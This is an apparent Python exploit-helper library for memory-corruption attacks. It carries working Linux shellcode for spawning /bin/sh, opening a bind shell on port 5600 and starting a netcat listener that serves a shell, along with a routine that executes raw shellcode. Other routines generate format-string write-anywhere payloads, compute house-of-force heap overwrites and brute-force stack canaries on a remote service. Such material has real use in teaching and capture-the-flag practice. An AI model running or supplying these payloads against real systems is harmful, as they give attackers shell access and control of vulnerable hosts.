
"""
This module contains utility functions useful to write python3 exploits

"""

"""  **************************  Exploit writing utilities  *********************
"""
import os,sys,struct,subprocess,ctypes


ARCH_X86_32="i386";
ARCH_X86_64="x86_64";
ARCH_ARM="arm"

CONSOLE_PWN="console"
NETWORN_PWN="network"

SHELLCODE_X86_64_LINUX_EXECVE_BINSH=b'\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' # 25 bytes execve("/bin/sh") 
SHELLCODE_X86_64_LINUX_BIND_5600=b'\x99\x6a\x29\x58\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x99\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x6a\x3b\x58\x0f\x05' #81 bytes  bindshell (PORT: 5600)
SHELLCODE_X86_64_LINUX_STACK_EGG_HUNTER=b'\x48\x89\xe0\x48\xbb\x47\x31\xc0\x90\x48\x31\xc0\x90\x48\xff\xc3\x48\xff\xc0\x48\x39\x18\x75\xf8\xff\xe0'#26 bytes stack egg hunter (EGG is "\x48\x31\xc0\x90\x48\x31\xc0\x90")
SHELLCODE_X86_32_LINUX_EXECVE_BINSH=b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' # 25 bytes. robust execve("/bin/sh") 
SHELLCODE_X86_32_LINUX_EXECVE_BINSH2 = b'\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x0f\x34'; #37 byte. execve("/bin/sh") using sysenter from __kernel_vsyscall appose to int $0x8. found on https://www.exploit-db.com/exploits/13413/
SHELLCODE_X86_32_LINUX_NC_L_17771 = b'\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80'; # 58 bytes /bin/nc -le /bin/sh -vp 17771 
SHELLCODE_ARM_LINUX_EXECVE_BINSH=b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'; # Linux/ARM - execve("/bin/sh",NULL,0) - 31 bytes
SYSCALLS_X86_64_LINUX={"read":0, "write":1, "open":2, "mmap":9, "sigreturn":15, "mprotect":10, "execve":59, "exit":60, "setreuid":113, "syncfs":306}
SYSCALLS_X86_32_LINUX={"read":3, "write":4, "open":5, "mmap":90, "mprotect":125, "execve":11, "exit":1, "setreuid":70}

class X():
    
    def __init__(self,arch, pwn_type=NETWORN_PWN):
        self.arch = arch
        self.pwn_type = pwn_type
        
    @property
    def nop(self):
        """ return NOP """
        if self.arch==ARCH_X86_32 or self.arch==ARCH_X86_64:
            return b'\x90'
    
    @property
    def junk(self):
        """ return packed junk """
        if self.arch==ARCH_X86_32 or self.arch==ARCH_ARM:
            return self.pack(0x42424242)
        elif self.arch==ARCH_X86_64:
            return self.pack(0x424242424242)
        
    @property
    def shellcode_execve_binsh(self):
        """ Returns a execve("/bin/sh") shellcode depending on architecture """
        if self.arch==ARCH_X86_32:
            return SHELLCODE_X86_32_LINUX_EXECVE_BINSH
        elif self.arch==ARCH_X86_64:
            return SHELLCODE_X86_64_LINUX_EXECVE_BINSH
        elif self.arch == ARCH_ARM:
            return SHELLCODE_ARM_LINUX_EXECVE_BINSH
    
    """ symlink to nclib """
    import nclib
    ncOpen = nclib.Netcat
    
    """ symlink to pexpect """
    import pexpect
    procOpen = pexpect.spawn

    def pack(self, integer):  
        """ Format hex integer into bytes """
        if self.arch==ARCH_X86_32 or self.arch==ARCH_ARM: 
            return struct.pack("I",integer); 
        elif  self.arch==ARCH_X86_64: 
            return struct.pack("P",integer)

    def unpack(self, hexBytes):  
        """ Unpack bytes hex value into integer and complete with padding """ 
        if self.arch==ARCH_X86_32 or self.arch==ARCH_ARM: 
            return struct.unpack("I", hexBytes+ b'\x00' * (4-len(hexBytes)))[0]; 
        elif  self.arch==ARCH_X86_64: 
            return struct.unpack("P", hexBytes+ b'\x00' * (8-len(hexBytes)))[0];

    
    def mask(self, target, nbBits):
        """ return the value of target with nbBits masked """
        if self.arch==ARCH_X86_32 or self.arch==ARCH_ARM: 
            mask = 0xffffffff << nbBits  
        elif  self.arch==ARCH_X86_64: 
            mask = 0xffffffffffffffff << nbBits 
        return mask & target 

    
    def unsignedInt(self, integer):
        """ Convert python int to C unsigned int equivalent. Useful for negative values. ex on 32 bit arch, -1 will return 0xffffffff """
        if self.arch==ARCH_X86_32 or self.arch==ARCH_ARM: 
            return struct.unpack('l', struct.pack('L', integer & 0xffffffff))[0]
        elif  self.arch==ARCH_X86_64: 
            return struct.unpack('q', struct.pack('Q', integer & 0xffffffffffffffff))[0] 

     


    def shellcodeToEnv(self, b_shellcode): 
        print(" [+] Put shellcode in envvar ENV_PWN...");
        os.environb[b'ENV_PWN']=((self.nop * 500)+b_shellcode)
    
    def bprint(self, b_exploit): 
        """ Print bytes to stdout """
        sys.stdout.buffer.write(b_exploit);
        print()
        
        
    def iToB(self,integer):
        """ Convert integer into its bytes string representation """
        return ("%d" % integer).encode()
        
        
    def runCommand(self, command): 
        return str(subprocess.getoutput(command))
    
    def unclosedSystemPipe(self, b_exploit, s_target):
        cmd = b'( echo \"'+ b_exploit +b'\";cat) | '+s_target.encode()+b';'
        os.system(cmd)
        
    def testShellcode(self, b_shellcode): 
        """ Test a shellcode, warning,  arch python must be same as shellcode arch """
        libc = ctypes.CDLL('libc.so.6');
        size = len(b_shellcode);
        addr = ctypes.c_void_p(libc.valloc(size));
        ctypes.memmove(addr, b_shellcode, size);
        libc.mprotect(addr, size, 0x7);
        run = ctypes.cast(addr, ctypes.CFUNCTYPE(ctypes.c_void_p));
        run()
        
    def getSyscall(self, s_name):
        if self.arch==ARCH_X86_32: 
            return SYSCALLS_X86_32_LINUX[s_name]; 
        elif  self.arch==ARCH_X86_64: 
            return SYSCALLS_X86_64_LINUX[s_name];
        
        
    def genFormatStringWrite(self,p_whereToWrite,p_whatToWrite,i_posInFmt):
        """ Generate a write anywhere format string attack (return bytes) """
        fmt=b'';
        if p_whereToWrite is not None:
            fmt += self.pack(p_whereToWrite)
            fmt += self.pack(p_whereToWrite+2)
            first = (p_whatToWrite & 0xffff)-8
            second = ((p_whatToWrite >> 16)-(first+8)) &  0xffff
        else:
            first = (p_whatToWrite & 0xffff)
            second = ((p_whatToWrite >> 16)-(first)) &  0xffff
        if self.pwn_type == CONSOLE_PWN: 
            fmt += b'%' + ("%d" % first).encode()+b'x%'+("%d" % i_posInFmt).encode()+b'\$n'; # '$' char must be escaped on a shell
            fmt += b'%' + ("%d" % second).encode()+b'x%'+("%d" % (i_posInFmt+1)).encode()+b'\$hn' # '$' char must be escaped on a shell
        else:
            fmt += b'%' + ("%d" % first).encode()+b'x%'+("%d" % i_posInFmt).encode()+b'$n';
            fmt += b'%' + ("%d" % second).encode()+b'x%'+("%d" % (i_posInFmt+1)).encode()+b'$hn'
        print(" [+] Generated format string -> %s" % str(fmt));
        return fmt
    
    
    def houseOfForce(self, p_whereToWrite, p_whatToWrite, p_topChunkAddr):
        """ 
        Calculate the size to use to exploit house of force technique
        Returns a tuple (size, payload)
        size should be used on the malloc AFTER the topchunk size was replaced by 0xffffffff
        When malloc(size) will be called, the new wilderness’ location will be computed by adding the normalized requested size to the old location of the top chunk 
        by using the chunk_at_offset macro. Once this value is computed, av->top is set to it. 
        The important thing is to let this value to point to an area under the exploiter’s control (may be the stack, .got, libc hook, etc). 
      
        Payload will overwrite this value based on p_whatToWrite input
        """
        #target_addr =  free_got 
        print(" [+] House of force processing...")
        print("     [-] Target addr 0x%x:"% p_whereToWrite)
        print("     [-] Top chunk addr 0x%x:"% p_topChunkAddr)
        """
        /*
         Convert request size to internal form by adding SIZE_SZ bytes
         overhead plus possibly more to obtain necessary alignment and/or
         to obtain a size of at least MINSIZE, the smallest allocatable
         size. Also, checked_request2size traps (returning 0) request sizes
         that are so large that they wrap around zero when padded and
         aligned.
        */
        checked_request2size (bytes, nb);
        """
        len_to_ret = p_whereToWrite - (0x8 + 0x8 + p_topChunkAddr) # -0x8 to keep space for prevsize+size and -0x8 for checked_request2size 
        len_to_ret = self.unsignedInt(len_to_ret) # Convert C integer type
    
        print("     [-] Computed len to target: %d, 0x%x, b%s" % (len_to_ret, len_to_ret, bin(len_to_ret)))
        masked_len_to_ret = self.mask(len_to_ret,3)
        # Size must be 8bit aligned
        print("     [-] 3 bit Masked len to target: %d, 0x%x, b%s" % (masked_len_to_ret, masked_len_to_ret, bin(masked_len_to_ret)))
        delta = int((len_to_ret - masked_len_to_ret)/4)
        print("     [-] Delta is: %d" % (delta))
        # since the 3 bit mask normalization we may get lower then our target, so we will multipyour chances
        overwrite_value = self.pack(p_whatToWrite) * (delta+1)
        # Return tuple
        return (masked_len_to_ret, overwrite_value)
    
    
    def bruteForceInt(self, payload,msgBrute_handler, b_egg):
        """
        Byte per byte Bruteforce integer. Use it to guess stack_canaries, ebp value, etc 
        based on the return of an egg that should be returned only if byte was guessed allright
        Param are the payload to fill the remote stack just before the int that must be guessed, 
        handler is the function used to send the generated messages, b_egg is the value we are checking.
        
        Function returns the guessed int
        
        Ex of msg_handler
        def connectAndSendMessage(b_message):
            nc =  x.ncOpen((SERVER, PORT), udp=False, verbose=True)
            nc.recv_until(b'Hello', 0.2) 
            nc.send(b_message)
            result = nc.recv_all()
            nc.close()
            return result
        """
        result = None; 
        bytesResult = list(self.pack(0));
        print(" [+] Bruteforcing in progress (%d bytes to bruteforce) ..." % len(bytesResult))
        for i in range(0, len(bytesResult)):
            bruteByte = 0
            while bruteByte < 256:
                if bytes ([ bruteByte ]) not in [ b'\x0a']:
                    cmd = payload
                    for j in range(0, i): 
                        cmd += bytes ( [ bytesResult[j] ]) # Append already found bytes
                    cmd += bytes ([ bruteByte ])  
                    result = msgBrute_handler(cmd)
                    if b_egg in result: 
                        bytesResult[i] = bruteByte
                        print("    [-] Found byte %d is 0x%x" % (i, bruteByte) )
                        break
                bruteByte+=1
            if bruteByte == 256: 
                print(" [!] Failed to bruteforce at byte %d. Maybe one char of address is part of forbidden values \n   -> Abort!" % i)
                return None
        return b''.join(bytes([x]) for x in bytesResult)

"""  **************************************************************************
"""


# Main function. Only call for unit tests
if __name__ == "__main__":
    print (" \n *********** Xploit helper Tests ************ \n ")

    
    
